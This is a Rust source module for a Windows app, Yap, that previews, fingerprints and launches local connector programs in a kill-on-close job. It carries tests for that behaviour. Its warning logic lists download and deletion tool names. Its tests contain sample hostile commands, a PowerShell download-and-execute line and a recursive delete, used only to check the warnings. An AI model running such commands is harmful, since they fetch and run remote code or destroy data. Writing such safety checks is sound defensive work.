//! **A program on this PC as a connector** (stdio): found, shown, started
//! in a kill-on-close job of its own.
//!
//! - **Found** on `PATH` with `PATHEXT` ([`resolve`]: `npx` is `npx.cmd`;
//!   Rust's own lookup only finds `.exe`), or the path given.
//! - **Shown before it first runs**: [`preview`] gives the exact command
//!   line, resolved to its full path and never cut, with warnings (`npx -y`
//!   and `uvx` fetch and run the latest version every start; a shell's
//!   `-c`; downloading with `curl`/`iwr`; deleting; a path outside the
//!   person's folders). Its [`fingerprint`] is what the person allowed
//!   (`store::Transport::Local::approved`): a command line that no longer
//!   matches never starts ([`Program::check`]).
//! - **Refused**: Yap's own exe with `mcp` (it would talk to itself).
//! - **Started** ([`spawn`]) with rmcp's child-process transport on
//!   process-wrap: its own job object (`JobObject`, started suspended,
//!   assigned, resumed: the `node.exe` that `npx.cmd` starts can't slip out
//!   of it), set to end everything in it when Yap's handle closes
//!   (`KillOnDrop`: Quit, a crash, End task) and no console window
//!   (`CREATE_NO_WINDOW`). A `.cmd` goes through Rust's own batch
//!   escaping, which refuses arguments it can't escape safely.
//! - **Its environment**: the person's, minus `YAP_*`, plus its own
//!   variables (a secret one's value from the vault). Never another
//!   connector's secrets or Yap's keys (none are in the environment).
//! - **Its folder**: `<data>/connectors/c<N>/`, empty to start with.
//! - **Its stderr**: the last [`STDERR_KEEP`] bytes in memory only, for Show
//!   details; never logged, never written.
//! - **No sandbox**: it runs with the person's own rights, and the preview
//!   says so.

use std::collections::VecDeque;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::{Arc, Mutex};

use serde::Serialize;
use sha2::{Digest, Sha256};

/// How much of a program's stderr is kept (in memory).
pub const STDERR_KEEP: usize = 64 * 1024;

/// A program, ready to start.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Program {
    pub path: PathBuf,
    pub args: Vec<String>,
    /// Its own variables (name, value), secrets included: never logged.
    pub env: Vec<(String, String)>,
    pub cwd: PathBuf,
}

/// What the person sees before a program first runs.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Preview {
    /// The full path it resolved to.
    pub resolved: String,
    /// The whole command line, as Windows will run it.
    pub command_line: String,
    pub warnings: Vec<String>,
    /// What `connector_add` must be given back: the command line was seen.
    pub fingerprint: String,
}

/// The extensions `PATHEXT` lists (`.COM;.EXE;.BAT;.CMD` when it's unset).
fn path_exts() -> Vec<String> {
    let raw = std::env::var("PATHEXT").unwrap_or_else(|_| ".COM;.EXE;.BAT;.CMD".into());
    raw.split(';').map(|e| e.trim().to_ascii_lowercase()).filter(|e| e.starts_with('.')).collect()
}

/// `command` as a program file: a path (absolute, or with a folder in it)
/// as given, else looked for in `PATH`'s folders with each of `PATHEXT`'s
/// extensions (or as it is, when it has one). `dirs` and `exts` given:
/// pure but for the file checks.
pub fn resolve_in(command: &str, dirs: &[PathBuf], exts: &[String]) -> Result<PathBuf, String> {
    let command = command.trim().trim_matches('"');
    if command.is_empty() {
        return Err("Say which program to run.".into());
    }
    let has_ext = |p: &Path| p.extension().is_some_and(|e| exts.iter().any(|x| x.trim_start_matches('.') == e.to_string_lossy().to_ascii_lowercase()));
    let try_file = |p: PathBuf| -> Option<PathBuf> {
        if has_ext(&p) && p.is_file() {
            return Some(p);
        }
        exts.iter().map(|e| PathBuf::from(format!("{}{e}", p.display()))).find(|p| p.is_file())
    };
    let given = PathBuf::from(command);
    if given.is_absolute() || command.contains(['\\', '/']) {
        return try_file(given).ok_or_else(|| format!("Yap can't find {command}."));
    }
    for dir in dirs {
        if let Some(found) = try_file(dir.join(command)) {
            return Ok(found);
        }
    }
    Err(format!("Yap can't find {command}. Install it, or give its full path, then try again."))
}

/// [`resolve_in`] on this PC's `PATH` and `PATHEXT`.
pub fn resolve(command: &str) -> Result<PathBuf, String> {
    let dirs: Vec<PathBuf> = std::env::var_os("PATH").map(|p| std::env::split_paths(&p).collect()).unwrap_or_default();
    resolve_in(command, &dirs, &path_exts())
}

/// One argument as Windows' command line carries it (quoted when it has a
/// space, a tab or a quote; quotes and the backslashes before them escaped).
fn quote(arg: &str) -> String {
    if !arg.is_empty() && !arg.contains([' ', '\t', '"']) {
        return arg.to_string();
    }
    let mut out = String::from("\"");
    let mut backslashes = 0;
    for c in arg.chars() {
        match c {
            '\\' => backslashes += 1,
            '"' => {
                out.push_str(&"\\".repeat(backslashes * 2 + 1));
                out.push('"');
                backslashes = 0;
            }
            _ => {
                out.push_str(&"\\".repeat(backslashes));
                backslashes = 0;
                out.push(c);
            }
        }
    }
    out.push_str(&"\\".repeat(backslashes * 2));
    out.push('"');
    out
}

/// The whole command line, as shown. Pure.
pub fn command_line(path: &Path, args: &[String]) -> String {
    std::iter::once(quote(&path.to_string_lossy())).chain(args.iter().map(|a| quote(a))).collect::<Vec<_>>().join(" ")
}

/// What the person allowed: the resolved command line and the variables'
/// names (and a plain one's value), hashed. Pure.
pub fn fingerprint(path: &Path, args: &[String], env: &[(String, Option<String>)]) -> String {
    let mut h = Sha256::new();
    h.update(command_line(path, args).as_bytes());
    let mut env: Vec<&(String, Option<String>)> = env.iter().collect();
    env.sort();
    for (name, value) in env {
        h.update(b"\0");
        h.update(name.as_bytes());
        h.update(b"=");
        h.update(value.as_deref().unwrap_or("\u{1}secret").as_bytes());
    }
    h.finalize().iter().take(12).map(|b| format!("{b:02x}")).collect()
}

/// The file name of `path`, lower case, without its extension.
fn stem(path: &Path) -> String {
    path.file_stem().map(|s| s.to_string_lossy().to_ascii_lowercase()).unwrap_or_default()
}

/// Why this command line is refused, if it is: Yap's own exe serving MCP.
/// `own_exe`: this Yap's exe. Pure.
pub fn refused(path: &Path, args: &[String], own_exe: Option<&Path>) -> Option<String> {
    let mcp = args.first().is_some_and(|a| a.eq_ignore_ascii_case("mcp"));
    let same = own_exe.is_some_and(|own| own.to_string_lossy().eq_ignore_ascii_case(&path.to_string_lossy()));
    let yap = stem(path).starts_with("yap") || stem(path).starts_with("kiku");
    (mcp && (same || yap)).then(|| "That's Yap's own MCP server: Yap can't be its own connector.".to_string())
}

/// What the person should know before this command line runs. `home`:
/// their profile folder (paths outside it are said). Pure.
pub fn warnings(path: &Path, args: &[String], home: Option<&Path>) -> Vec<String> {
    let mut out = vec!["Yap will run this program with your permissions. It can read and change anything you can, so only add programs you trust.".to_string()];
    let prog = stem(path);
    let lower: Vec<String> = args.iter().map(|a| a.to_ascii_lowercase()).collect();
    let has = |a: &str| lower.iter().any(|x| x == a);
    if (prog == "npx" && (has("-y") || has("--yes"))) || prog == "uvx" || prog == "bunx" || (prog == "pnpm" && has("dlx")) {
        out.push("It downloads and runs the latest version of a package every time it starts.".into());
    } else if prog == "npx" {
        out.push("It may download a package from npm the first time it starts.".into());
    }
    let shell = ["cmd", "powershell", "pwsh", "bash", "sh", "wsl"].contains(&prog.as_str());
    if shell && lower.iter().any(|a| ["/c", "/k", "-c", "-command", "-encodedcommand", "-e"].contains(&a.as_str())) {
        out.push("It runs a shell command, which can do anything.".into());
    }
    // The words of every argument (a shell's command is one argument).
    let tokens: Vec<&str> = lower
        .iter()
        .flat_map(|a| a.split(|c: char| c.is_whitespace() || c == ';' || c == '|' || c == '&'))
        .filter(|t| !t.is_empty())
        .collect();
    let any = |list: &[&str]| list.contains(&prog.as_str()) || tokens.iter().any(|t| list.contains(t));
    if any(&["curl", "wget", "iwr", "invoke-webrequest", "irm", "invoke-restmethod"]) {
        out.push("It downloads from the internet.".into());
    }
    if any(&["rm", "del", "erase", "rmdir", "rd", "remove-item", "format"]) {
        out.push("It deletes files.".into());
    }
    if let Some(home) = home {
        let home = home.to_string_lossy().to_ascii_lowercase();
        let outside = args.iter().filter(|a| {
            let a = a.trim_matches('"');
            let p = Path::new(a);
            (p.is_absolute() || a.starts_with("\\\\")) && !a.to_ascii_lowercase().starts_with(&home)
        });
        if outside.clone().next().is_some() {
            out.push("It's given folders or files outside your own folders.".into());
        }
    }
    out
}

/// [`Preview`] of a program before it's added: resolved, its command line,
/// warnings and fingerprint. `env`: its variables' names, a plain one's value.
pub fn preview(command: &str, args: &[String], env: &[(String, Option<String>)]) -> Result<Preview, String> {
    let path = resolve(command)?;
    let own = std::env::current_exe().ok();
    if let Some(why) = refused(&path, args, own.as_deref()) {
        return Err(why);
    }
    Ok(Preview {
        resolved: path.to_string_lossy().into_owned(),
        command_line: command_line(&path, args),
        warnings: warnings(&path, args, dirs::home_dir().as_deref()),
        fingerprint: fingerprint(&path, args, env),
    })
}

impl Program {
    /// The program to start for a stored connector: its path as allowed,
    /// still there, still the command line the person saw.
    pub fn check(resolved: &str, args: &[String], env: &[(String, Option<String>)], approved: &str) -> Result<PathBuf, String> {
        let path = PathBuf::from(resolved);
        if !path.is_file() {
            return Err(format!("Couldn't start: Yap can't find {} any more. Install it again, then Try again.", path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default()));
        }
        if approved.is_empty() || fingerprint(&path, args, env) != approved {
            return Err("This program's command changed since you allowed it, so Yap won't run it. Add it again to see what it runs.".into());
        }
        let own = std::env::current_exe().ok();
        if let Some(why) = refused(&path, args, own.as_deref()) {
            return Err(why);
        }
        Ok(path)
    }
}

/// A program's last stderr lines, in memory only.
#[derive(Debug, Default)]
pub struct Ring {
    bytes: VecDeque<u8>,
}

impl Ring {
    pub fn push(&mut self, chunk: &[u8]) {
        self.bytes.extend(chunk);
        let extra = self.bytes.len().saturating_sub(STDERR_KEEP);
        self.bytes.drain(..extra);
    }

    /// Its last `n` lines.
    pub fn tail(&self, n: usize) -> Vec<String> {
        let (a, b) = self.bytes.as_slices();
        let text = String::from_utf8_lossy(&[a, b].concat()).into_owned();
        let lines: Vec<&str> = text.lines().filter(|l| !l.trim().is_empty()).collect();
        lines[lines.len().saturating_sub(n)..].iter().map(|l| l.to_string()).collect()
    }

    pub fn clear(&mut self) {
        self.bytes.clear();
    }
}

/// `program` started ([module docs](self)): rmcp's transport over its stdio,
/// its stderr read into `stderr`.
pub fn spawn(program: &Program, stderr: Arc<Mutex<Ring>>) -> Result<rmcp::transport::TokioChildProcess, String> {
    use process_wrap::tokio::{CommandWrap, KillOnDrop};
    if let Err(e) = std::fs::create_dir_all(&program.cwd) {
        tracing::warn!(kind = ?e.kind(), "connectors: couldn't make a program's folder");
    }
    let mut cmd = tokio::process::Command::new(&program.path);
    cmd.args(&program.args).current_dir(&program.cwd);
    for (name, _) in std::env::vars_os() {
        if name.to_string_lossy().to_ascii_uppercase().starts_with("YAP_") {
            cmd.env_remove(&name);
        }
    }
    cmd.envs(program.env.iter().map(|(k, v)| (k.as_str(), v.as_str())));
    let mut wrap = CommandWrap::from(cmd);
    #[cfg(windows)]
    {
        use process_wrap::tokio::{CreationFlags, JobObject};
        wrap.wrap(CreationFlags(windows::Win32::System::Threading::CREATE_NO_WINDOW));
        wrap.wrap(JobObject);
    }
    wrap.wrap(KillOnDrop);
    let (proc, err) = rmcp::transport::TokioChildProcess::builder(wrap)
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| spawn_error(&program.path, &e))?;
    if let Some(mut err) = err {
        tokio::spawn(async move {
            use tokio::io::AsyncReadExt;
            let mut buf = [0u8; 4096];
            loop {
                match err.read(&mut buf).await {
                    Ok(0) | Err(_) => break,
                    Ok(n) => stderr.lock().unwrap_or_else(|p| p.into_inner()).push(&buf[..n]),
                }
            }
        });
    }
    Ok(proc)
}

/// Why a program didn't start, in plain words.
fn spawn_error(path: &Path, e: &std::io::Error) -> String {
    let name = path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    match e.kind() {
        std::io::ErrorKind::NotFound => format!("Couldn't start: Yap can't find {name}."),
        std::io::ErrorKind::PermissionDenied => format!("Couldn't start {name}: Windows wouldn't let Yap run it."),
        // Rust's batch-file escaping refuses arguments it can't pass safely.
        std::io::ErrorKind::InvalidInput => format!("Couldn't start {name}: one of its arguments can't be passed to a .cmd or .bat file safely."),
        _ => format!("Couldn't start {name}."),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scratch(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("yap-connectors-local-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn a_command_is_found_with_pathext_and_a_path_is_taken_as_given() {
        let dir = scratch("resolve");
        std::fs::write(dir.join("npx.cmd"), "@echo off").unwrap();
        std::fs::write(dir.join("tool.exe"), "MZ").unwrap();
        std::fs::write(dir.join("readme"), "x").unwrap();
        let exts = vec![".com".to_string(), ".exe".to_string(), ".bat".to_string(), ".cmd".to_string()];
        let dirs = vec![dir.join("empty"), dir.clone()];
        assert_eq!(resolve_in("npx", &dirs, &exts).unwrap(), dir.join("npx.cmd"));
        assert_eq!(resolve_in("tool", &dirs, &exts).unwrap(), dir.join("tool.exe"));
        assert_eq!(resolve_in("tool.exe", &dirs, &exts).unwrap(), dir.join("tool.exe"));
        assert!(resolve_in("readme", &dirs, &exts).is_err(), "not a program");
        assert!(resolve_in("nothing-here", &dirs, &exts).unwrap_err().contains("can't find"));
        let full = dir.join("tool.exe");
        assert_eq!(resolve_in(&full.to_string_lossy(), &[], &exts).unwrap(), full);
        assert_eq!(resolve_in(&format!("\"{}\"", dir.join("tool").display()), &[], &exts).unwrap(), full);
        assert!(resolve_in("", &dirs, &exts).is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn the_command_line_is_whole_and_quoted_as_windows_reads_it() {
        let p = Path::new(r"C:\Program Files\nodejs\npx.cmd");
        let args = vec!["-y".to_string(), "@modelcontextprotocol/server-filesystem".to_string(), r"C:\Users\sam\My Files".to_string(), r#"say "hi""#.to_string(), String::new()];
        assert_eq!(
            command_line(p, &args),
            r#""C:\Program Files\nodejs\npx.cmd" -y @modelcontextprotocol/server-filesystem "C:\Users\sam\My Files" "say \"hi\"" """#
        );
        assert_eq!(quote(r"C:\a b\"), r#""C:\a b\\""#);
    }

    #[test]
    fn the_fingerprint_follows_what_runs_and_never_a_secrets_value() {
        let p = Path::new(r"C:\tools\server.exe");
        let a = fingerprint(p, &["--port".into(), "1".into()], &[("TOKEN".into(), None), ("LOG".into(), Some("1".into()))]);
        assert_eq!(a, fingerprint(p, &["--port".into(), "1".into()], &[("LOG".into(), Some("1".into())), ("TOKEN".into(), None)]), "variables in any order");
        assert_ne!(a, fingerprint(p, &["--port".into(), "2".into()], &[("TOKEN".into(), None), ("LOG".into(), Some("1".into()))]));
        assert_ne!(a, fingerprint(Path::new(r"C:\tools\other.exe"), &["--port".into(), "1".into()], &[("TOKEN".into(), None), ("LOG".into(), Some("1".into()))]));
        assert_ne!(a, fingerprint(p, &["--port".into(), "1".into()], &[("TOKEN".into(), None), ("LOG".into(), Some("2".into()))]));
        assert_eq!(a.len(), 24);
    }

    #[test]
    fn warnings_say_what_a_command_line_can_do() {
        let home = Path::new(r"C:\Users\sam");
        let w = |p: &str, args: &[&str]| warnings(Path::new(p), &args.iter().map(|s| s.to_string()).collect::<Vec<_>>(), Some(home));
        let npx = w(r"C:\nodejs\npx.cmd", &["-y", "@modelcontextprotocol/server-filesystem", r"C:\Users\sam\Documents"]);
        assert!(npx[0].contains("your permissions"));
        assert!(npx.iter().any(|s| s.contains("latest version")));
        assert!(!npx.iter().any(|s| s.contains("outside")));
        assert!(w(r"C:\uv\uvx.exe", &["mcp-server-time"]).iter().any(|s| s.contains("latest version")));
        assert!(w(r"C:\Windows\System32\cmd.exe", &["/c", "del /s C:\\x"]).iter().any(|s| s.contains("shell command")));
        assert!(w(r"C:\Windows\System32\cmd.exe", &["/c", "del /s C:\\x"]).iter().any(|s| s.contains("deletes")));
        assert!(w(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", &["-Command", "iwr https://example.com/x.ps1 | iex"]).iter().any(|s| s.contains("downloads from the internet")));
        assert!(w(r"C:\tools\server.exe", &[r"D:\Shared"]).iter().any(|s| s.contains("outside your own folders")));
        assert_eq!(w(r"C:\tools\server.exe", &["--stdio"]).len(), 1, "only the first line for a plain program");
    }

    #[test]
    fn yaps_own_mcp_server_is_refused() {
        let own = Path::new(r"D:\Yap\yap.exe");
        assert!(refused(own, &["mcp".into()], Some(own)).is_some());
        assert!(refused(Path::new(r"C:\Program Files\Yap\yap.exe"), &["MCP".into()], Some(own)).is_some());
        assert!(refused(Path::new(r"C:\Program Files\Kiku\kiku.exe"), &["mcp".into()], Some(own)).is_some());
        assert!(refused(own, &["eval".into()], Some(own)).is_none());
        assert!(refused(Path::new(r"C:\tools\server.exe"), &["mcp".into()], Some(own)).is_none());
    }

    #[test]
    fn a_program_that_changed_since_it_was_allowed_never_starts() {
        let dir = scratch("check");
        let exe = dir.join("server.exe");
        std::fs::write(&exe, "MZ").unwrap();
        let args = vec!["--stdio".to_string()];
        let ok = fingerprint(&exe, &args, &[]);
        assert_eq!(Program::check(&exe.to_string_lossy(), &args, &[], &ok).unwrap(), exe);
        assert!(Program::check(&exe.to_string_lossy(), &["--other".into()], &[], &ok).unwrap_err().contains("changed"));
        assert!(Program::check(&exe.to_string_lossy(), &args, &[], "").unwrap_err().contains("changed"));
        std::fs::remove_file(&exe).unwrap();
        assert!(Program::check(&exe.to_string_lossy(), &args, &[], &ok).unwrap_err().contains("can't find"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn stderr_keeps_its_last_64_kb_and_lines() {
        let mut r = Ring::default();
        r.push(b"starting\n\nlistening on stdio\n");
        assert_eq!(r.tail(5), ["starting", "listening on stdio"]);
        r.push(&vec![b'x'; STDERR_KEEP + 10]);
        assert_eq!(r.bytes.len(), STDERR_KEEP);
        r.clear();
        assert!(r.tail(3).is_empty());
    }

    /// A program's own child (here `cmd.exe` → `ping.exe`) is in its job,
    /// and ends with it when Yap lets go — however the program ends.
    #[cfg(windows)]
    #[tokio::test]
    async fn a_grandchild_ends_with_the_programs_job() {
        let sys = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
        let cmd = PathBuf::from(&sys).join("System32").join("cmd.exe");
        let program = Program {
            path: cmd,
            args: ["/d", "/c", "ping", "-n", "60", "127.0.0.1"].map(String::from).to_vec(),
            env: vec![("YAP_CONNECTOR_TEST".into(), "1".into())],
            cwd: scratch("job"),
        };
        let since = crate::shell::procs::now_filetime();
        let proc = spawn(&program, Arc::new(Mutex::new(Ring::default()))).unwrap();
        let pid = proc.id().expect("its pid");
        let mut grandchild = None;
        for _ in 0..100 {
            grandchild = crate::shell::procs::family(pid, since).into_iter().find(|&p| {
                p != pid && crate::shell::procs::image_path(p).is_some_and(|path| path.to_ascii_lowercase().ends_with("ping.exe"))
            });
            if grandchild.is_some() {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        let grandchild = grandchild.expect("cmd started ping");
        drop(proc);
        let mut gone = false;
        for _ in 0..100 {
            if crate::shell::procs::image_path(grandchild).is_none() {
                gone = true;
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        assert!(gone, "ping.exe outlived its program's job");
        assert!(crate::shell::procs::image_path(pid).is_none(), "and so did cmd.exe");
        let _ = std::fs::remove_dir_all(&program.cwd);
    }
}
